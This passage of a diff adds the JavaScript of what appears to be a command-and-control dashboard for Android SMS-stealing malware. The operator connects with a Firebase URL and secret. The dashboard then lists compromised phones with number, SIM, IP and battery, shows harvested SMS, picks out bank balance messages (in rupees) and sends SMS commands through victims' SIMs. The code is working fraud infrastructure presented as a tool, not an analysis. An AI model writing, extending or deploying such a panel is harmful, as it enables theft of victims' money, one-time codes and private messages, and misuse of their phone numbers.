+  document.getElementById('st-bank').textContent = state.bankCount || 0;
+}
+
+/* ───── Device list render ───── */
+function renderDeviceList() {
+  const list = document.getElementById('device-list');
+  let filtered = state.devices.slice();
+
+  // Filter
+  if (state.filter === 'online') filtered = filtered.filter(d => d.online);
+  else if (state.filter === 'offline') filtered = filtered.filter(d => !d.online);
+  else if (state.filter === 'bank') filtered = filtered.filter(d => (state.deviceBank[d.id] || []).length > 0);
+
+  // Search
+  if (state.search) {
+    const q = state.search.toLowerCase();
+    filtered = filtered.filter(d =>
+      d.id.toLowerCase().includes(q) ||
+      (d.name || '').toLowerCase().includes(q) ||
+      (d.phone || '').toLowerCase().includes(q)
+    );
+  }
+
+  if (!filtered.length) {
+    list.innerHTML = `<div class="empty"><div class="empty-icon">😴</div><div>No devices match</div></div>`;
+    return;
+  }
+
+  let html = '';
+  for (const d of filtered) {
+    const bankArr = state.deviceBank[d.id] || [];
+    const bat = d.battery != null ? d.battery : null;
+    const batCls = bat == null ? '' : bat < 20 ? 'low' : bat < 50 ? 'warn' : '';
+    const batFillCls = bat == null ? '' : bat < 20 ? 'low' : bat < 50 ? 'warn' : '';
+    const latestBalance = bankArr.length ? bankArr[0] : null;
+
+    html += `<div class="device-card ${d.online ? '' : 'offline'}" data-id="${esc(d.id)}">
+      <div class="device-head">
+        <div class="device-icon ${d.online ? 'online' : ''}">📶</div>
+        <div class="device-meta">
+          <div class="device-id">${esc(d.name || d.id.substring(0, 14))}</div>
+          <div class="device-name">${esc(d.id)}</div>
+        </div>
+        ${bankArr.length ? '<div class="device-star">₹</div>' : ''}
+        <div class="device-star">⋮</div>
+      </div>
+      <div class="device-grid">
+        <div class="dg-cell">
+          <div class="dg-label">Android</div>
+          <div class="dg-val">${esc(d.android || '—')}</div>
+        </div>
+        <div class="dg-cell">
+          <div class="dg-label">Battery</div>
+          <div class="battery-wrap">
+            <div class="battery-icon"><div class="battery-fill ${batFillCls}" style="width:${bat == null ? 0 : bat}%"></div></div>
+            <div class="battery-pct ${batCls}">${bat == null ? '—' : bat + '%'}</div>
+          </div>
+        </div>
+        <div class="dg-cell">
+          <div class="dg-label">Number</div>
+          <div class="dg-val mono">${esc(d.phone || '—')}</div>
+        </div>
+        <div class="dg-cell">
+          <div class="dg-label">Network</div>
+          <div class="dg-val">${esc(d.network || '—')}</div>
+        </div>
+      </div>
+      ${latestBalance ? `
+      <div class="balance-strip">
+        <div class="balance-name">₹ ${esc(latestBalance.bank || 'BANK')}${latestBalance.account ? ' ••' + esc(latestBalance.account) : ''}</div>
+        <div class="balance-amt">₹${latestBalance.balance != null ? latestBalance.balance.toLocaleString('en-IN') : '—'}</div>
+      </div>` : ''}
+      <div class="device-status ${d.online ? 'online' : 'offline'}">
+        <span class="device-status-dot"></span>
+        <span>${d.online ? 'Online' : 'Offline'}</span>
+      </div>
+    </div>`;
+  }
+
+  list.innerHTML = html;
+
+  // Bind card clicks
+  list.querySelectorAll('.device-card').forEach(card => {
+    card.addEventListener('click', () => openDetail(card.dataset.id));
+  });
+}
+
+/* ───── Detail view ───── */
+function openDetail(id) {
+  const dev = state.devices.find(d => d.id === id);
+  if (!dev) return;
+  state.currentDevice = dev;
+  state.currentTab = 'info';
+
+  document.getElementById('detail-title').textContent = id;
+
+  const st = document.getElementById('detail-status');
+  st.className = 'detail-status ' + (dev.online ? 'online' : 'offline');
+  st.innerHTML = `<span class="device-status-dot"></span><span>${dev.online ? 'Online' : 'Offline'}</span>`;
+
+  const bat = dev.battery;
+  const batEl = document.getElementById('detail-bat');
+  batEl.textContent = bat == null ? '—' : bat + '%';
+  batEl.className = 'detail-bat' + (bat != null && bat < 20 ? ' low' : bat != null && bat < 50 ? ' warn' : '');
+
+  const bankArr = state.deviceBank[dev.id] || [];
+  const bankPill = document.getElementById('detail-bank-pill');
+  if (bankArr.length) {
+    bankPill.style.display = '';
+    bankPill.textContent = bankArr.length + ' Bank SMS';
+  } else {
+    bankPill.style.display = 'none';
+  }
+
+  document.querySelectorAll('.detail-tab').forEach(t => {
+    t.classList.toggle('active', t.dataset.tab === 'info');
+  });
+
+  renderDetailContent();
+
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('detail-screen').classList.add('active');
+  window.scrollTo(0, 0);
+}
+
+function renderDetailContent() {
+  const dev = state.currentDevice;
+  const c = document.getElementById('detail-content');
+  const tab = state.currentTab;
+
+  if (tab === 'info') {
+    const d = dev;
+    c.innerHTML = `
+      <div class="info-section-title">Device</div>
+      <div class="info-list">
+        <div class="info-row"><span class="k">Phone Number</span><span class="v ${d.phone ? '' : 'blank'}">${esc(d.phone || '—')}</span></div>
+        <div class="info-row"><span class="k">Network</span><span class="v ${d.network ? '' : 'blank'}">${esc(d.network || '—')}</span></div>
+        <div class="info-row"><span class="k">Android</span><span class="v ${d.android ? '' : 'blank'}">${esc(d.android || '—')}</span></div>
+        <div class="info-row"><span class="k">IP Address</span><span class="v ${d.ip ? '' : 'blank'}">${esc(d.ip || '—')}</span></div>
+        <div class="info-row"><span class="k">Storage</span><span class="v ${d.storage ? '' : 'blank'}">${d.storage ? fmtBytes(d.storage.used) + ' / ' + fmtBytes(d.storage.total) : '—'}</span></div>
+        <div class="info-row"><span class="k">CPU Arch</span><span class="v ${d.cpu ? '' : 'blank'}">${esc(d.cpu || '—')}</span></div>
+        <div class="info-row"><span class="k">SDK Version</span><span class="v ${d.sdk ? '' : 'blank'}">${esc(d.sdk || '—')}</span></div>
+        <div class="info-row"><span class="k">SIM Cards</span><span class="v">${d.simCount || 0} SIM(s)</span></div>
+        <div class="info-row"><span class="k">Last Seen</span><span class="v">${esc(d.lastSeen || '—')}</span></div>
+      </div>
+      ${d.sims && d.sims.length ? `
+        <div class="info-section-title">SIM Details</div>
+        <div class="info-list">
+          ${d.sims.map((s, i) => `
+            <div class="info-row"><span class="k">SIM ${i+1} (${esc(s.carrier || '—')})</span><span class="v ${s.phone ? '' : 'blank'}">${esc(s.phone || '—')}</span></div>
+          `).join('')}
+        </div>` : ''}
+      <div class="info-section-title">From SMS</div>
+      <div class="info-list" id="from-sms-list"><div class="info-row"><span class="k">Loading…</span></div></div>
+    `;
+    renderFromSms();
+  }
+
+  else if (tab === 'bank') {
+    const bankArr = state.deviceBank[dev.id] || [];
+    if (!bankArr.length) {
+      c.innerHTML = `<div class="empty"><div class="empty-icon">🏦</div><div>No bank messages found</div></div>`;
+      return;
+    }
+    const latest = bankArr[0];
+    let html = `<div class="bank-summary">
+      <div class="bank-sum-label">LATEST BALANCE · ${esc(latest.bank || 'BANK')}</div>
+      <div class="bank-sum-amt">₹${latest.balance != null ? latest.balance.toLocaleString('en-IN', {minimumFractionDigits:2}) : '—'}<span class="bank-sum-acct">${latest.account ? '••' + esc(latest.account) : ''}</span></div>
+    </div>`;
+
+    for (const b of bankArr) {
+      html += `<div class="bank-card">
+        <div class="bank-card-head">
+          <div class="bank-card-name">₹ ${esc(b.bank || 'BANK')}</div>
+          <div class="bank-card-acct">${b.account ? '••' + esc(b.account) : ''}</div>
+        </div>
+        <div class="bank-card-label">Available Balance</div>
+        <div class="bank-card-bal">₹${b.balance != null ? b.balance.toLocaleString('en-IN', {minimumFractionDigits:2}) : '—'}</div>
+        ${b.txnAmount != null ? `
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px">
+            <div class="bank-card-label" style="margin:0">Transaction</div>
+            <div class="bank-card-txn ${b.txnType === 'credit' ? 'credit' : 'debit'}">${b.txnType === 'credit' ? '+' : '-'}₹${b.txnAmount.toLocaleString('en-IN', {minimumFractionDigits:2})}</div>
+          </div>` : ''}
+        <div class="bank-card-msg">${esc(b.body)}</div>
+        <div class="sms-time" style="margin-top:8px">${esc(b.time)}</div>
+      </div>`;
+    }
+    c.innerHTML = html;
+  }
+
+  else if (tab === 'sms') {
+    const smsArr = state.deviceSms[dev.id] || [];
+    if (!smsArr.length) {
+      c.innerHTML = `<div class="empty"><div class="empty-icon">📩</div><div>No messages found</div></div>`;
+      return;
+    }
+    let html = `<div style="color:var(--grey);font-size:12px;margin-bottom:12px;font-family:var(--mono)">Last ${Math.min(60, smsArr.length)} messages · auto-refreshes</div><div class="sms-list">`;
+    for (const s of smsArr.slice(0, 60)) {
+      html += `<div class="sms-card">
+        <div class="sms-head">
+          <div class="sms-sender">${esc(s.sender || '—')}</div>
+          <div class="sms-time">${esc(s.at)}</div>
+        </div>
+        <div class="sms-body">${esc(s.body)}</div>
+      </div>`;
+    }
+    html += '</div>';
+    c.innerHTML = html;
+  }
+
+  else if (tab === 'send') {
+    const sims = dev.sims && dev.sims.length ? dev.sims : [{slot:0, phone:dev.phone, carrier:dev.network}];
+    c.innerHTML = `
+      <div style="color:var(--grey);font-size:11px;letter-spacing:1.5px;margin-bottom:10px">SELECT SIM</div>
+      <div class="send-sim-row" id="sim-row">
+        ${sims.map((s, i) => `
+          <button class="send-sim-btn ${i === 0 ? 'active' : ''}" data-slot="${s.slot}">SIM ${i+1}</button>
+        `).join('')}
+      </div>
+      <div class="send-field">
+        <label>Recipient</label>
+        <input type="tel" id="send-to" placeholder="+91XXXXXXXXXX" value="">
+      </div>
+      <div class="send-field">
+        <label>Message</label>
+        <textarea id="send-msg" placeholder="Type your message here..."></textarea>
+        <div class="send-char"><span id="char-count">0</span> chars</div>
+      </div>
+      <button class="btn-send" id="send-btn">✈ Send via SIM 1</button>
+      <div class="send-note">Use device number: ${esc(dev.network || '')} ${esc(dev.phone || '')}</div>
+    `;
+
+    let selectedSlot = sims[0].slot;
+    document.querySelectorAll('.send-sim-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        document.querySelectorAll('.send-sim-btn').forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+        selectedSlot = parseInt(btn.dataset.slot, 10);
+        document.getElementById('send-btn').textContent = '✈ Send via ' + btn.textContent;
+      });
+    });
+
+    const msgTa = document.getElementById('send-msg');
+    const cc = document.getElementById('char-count');
+    msgTa.addEventListener('input', () => { cc.textContent = msgTa.value.length; });
+
+    document.getElementById('send-btn').addEventListener('click', async () => {
+      const to = document.getElementById('send-to').value.trim();
+      const msg = msgTa.value.trim();
+      if (!to) { toast('Enter recipient number', 'err'); return; }
+      if (!msg) { toast('Enter message', 'err'); return; }
+      if (!dev.online) { toast('Device is offline', 'err'); return; }
+
+      const btn = document.getElementById('send-btn');
+      btn.disabled = true;
+      btn.textContent = 'Sending...';
+
+      const payload = {
+        from: selectedSlot,
+        to: to,
+        message: msg,
+        isSended: false,
+        timestamp: Math.floor(Date.now() / 1000)
+      };
+
+      const ok = await fbPut('/clients/' + dev.id + '/webhookEvent/sendSms', payload);
+      if (ok) {
+        toast('✅ Command sent to device', 'ok');
+        btn.textContent = '✈ Sent';
+        setTimeout(() => {
+          btn.disabled = false;
+          btn.textContent = '✈ Send via SIM ' + (selectedSlot + 1);
+        }, 2000);
+      } else {
+        toast('❌ Failed to send command', 'err');
+        btn.disabled = false;
+        btn.textContent = '✈ Send';
+      }
+    });
+  }
+}
+
+function fmtBytes(n) {
+  if (!n) return '—';
+  if (n < 1e9) return (n / 1e6).toFixed(1) + ' MB';
+  return (n / 1e9).toFixed(1) + ' GB';
+}
+
+async function renderFromSms() {
+  const dev = state.currentDevice;
+  if (!dev) return;
+  const el = document.getElementById('from-sms-list');
+  if (!el) return;
+  const smsArr = state.deviceSms[dev.id] || [];
+  if (!smsArr.length) {
+    el.innerHTML = '<div class="info-row"><span class="k">No SMS</span></div>';
+    return;
+  }
+  // Unique phone numbers from senders
+  const numbers = new Set();
+  for (const s of smsArr) {
+    const m = (s.sender || '').match(/(\+?\d{10,13})/);
+    if (m) numbers.add(m[1]);
+  }
+  if (!numbers.size) {
+    el.innerHTML = '<div class="info-row"><span class="k">No phone numbers found</span></div>';
+    return;
+  }
+  let html = '';
+  let i = 1;
+  for (const n of numbers) {
+    html += `<div class="info-row"><span class="k">Phone #${i}</span><span class="v">${esc(n)}</span></div>`;
+    i++;
+  }
+  el.innerHTML = html;
+}
+
+/* ───── Login ───── */
+function renderSavedAccounts() {
+  const list = document.getElementById('saved-list');
+  const wrap = document.getElementById('saved-accounts-wrap');
+  if (!state.accounts.length) { wrap.style.display = 'none'; return; }
+  wrap.style.display = '';
+  let html = '';
+  for (let i = 0; i < state.accounts.length; i++) {
+    const a = state.accounts[i];
+    const short = a.url.replace(/^https?:\/\//, '').split('.')[0];
+    html += `<div class="saved-acc" data-idx="${i}">
+      <div class="saved-icon">🔥</div>
+      <div class="saved-info">
+        <div class="saved-url">${esc(a.url.replace(/^https?:\/\//, ''))}</div>
+        <div class="saved-time">${esc(a.addedLabel || '')}</div>
+      </div>
+      <button class="saved-del" data-del="${i}">🗑</button>
+    </div>`;
+  }
+  list.innerHTML = html;
+
+  list.querySelectorAll('.saved-acc').forEach(el => {
+    el.addEventListener('click', async (e) => {
+      if (e.target.dataset.del != null) return;
+      const idx = parseInt(el.dataset.idx, 10);
+      const acc = state.accounts[idx];
+      state.current = { url: acc.url, secret: acc.secret || '' };
+      enterDashboard();
+    });
+  });
+  list.querySelectorAll('.saved-del').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const i = parseInt(btn.dataset.del, 10);
+      state.accounts.splice(i, 1);
+      saveAccounts();
+      renderSavedAccounts();
+    });
+  });
+}
+
+document.getElementById('connect-btn').addEventListener('click', async () => {
+  const url = document.getElementById('fb-url').value.trim();
+  const secret = document.getElementById('fb-secret').value.trim();
+  const err = document.getElementById('login-err');
+  err.textContent = '';
+
+  if (!url) { err.textContent = 'Firebase URL required'; return; }
+
+  state.current = { url, secret };
+
+  // Test the connection
+  err.textContent = 'Testing connection...';
+  const test = await fbGet('/');
+  if (test === null) {
+    // Could be rules deny read; still try
+    err.textContent = 'Warning: could not read root. Trying anyway...';
+  }
+
+  // Save account
+  const exists = state.accounts.find(a => a.url === url);
+  if (!exists) {
+    state.accounts.unshift({
+      url, secret,
+      added: Date.now(),
+      addedLabel: new Date().toLocaleString()
+    });
+    saveAccounts();
+  }
+
+  err.textContent = '';
+  enterDashboard();
+});
+
+/* ───── Enter dashboard ───── */
+async function enterDashboard() {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('dashboard-screen').classList.add('active');
+  window.scrollTo(0, 0);
+  updateClock();
+  await loadDevices();
+}
+
+/* ───── Clock ───── */
+function updateClock() {
+  const d = new Date();
+  const p = n => String(n).padStart(2, '0');
+  document.getElementById('clock').textContent = p(d.getHours()) + ':' + p(d.getMinutes());
+}
+setInterval(updateClock, 30000);
+
+/* ───── Filters ───── */
+document.querySelectorAll('#filters .chip').forEach(chip => {
+  chip.addEventListener('click', () => {
+    document.querySelectorAll('#filters .chip').forEach(c => c.classList.remove('active'));
+    chip.classList.add('active');
+    state.filter = chip.dataset.filter;
+    renderDeviceList();
+  });
+});
+
+/* ───── Search ───── */
+document.getElementById('search').addEventListener('input', (e) => {
+  state.search = e.target.value.trim();
+  renderDeviceList();
+});
+
+/* ───── Refresh ───── */
+document.getElementById('refresh-btn').addEventListener('click', async (e) => {
+  e.currentTarget.classList.add('spin');
+  await loadDevices();
+  setTimeout(() => e.currentTarget.classList.remove('spin'), 400);
+});
+
+/* ───── Logout ───── */
+document.getElementById('logout-btn').addEventListener('click', () => {
+  state.current = null;
+  state.devices = [];
+  state.deviceSms = {};
+  state.deviceBank = {};
+  state.bankCount = 0;
+  state.currentDevice = null;
+  document.getElementById('device-list').innerHTML = '';
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('login-screen').classList.add('active');
+  renderSavedAccounts();
+});
+
+/* ───── Detail back ───── */
+document.getElementById('detail-back').addEventListener('click', () => {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('dashboard-screen').classList.add('active');
+});
+
+/* ───── Detail tabs ───── */
+document.querySelectorAll('.detail-tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('.detail-tab').forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+    state.currentTab = tab.dataset.tab;
+    renderDetailContent();
+  });
+});
+
+/* ───── Init ───── */
+loadAccounts();
+renderSavedAccounts();
+
+/* Auto-refresh device list every 60s while on dashboard */
+setInterval(() => {
+  if (document.getElementById('dashboard-screen').classList.contains('active') && state.current) {
+    loadDevices().catch(() => {});
+  }
+}, 60000);
+</script>
+</body>
+</html>
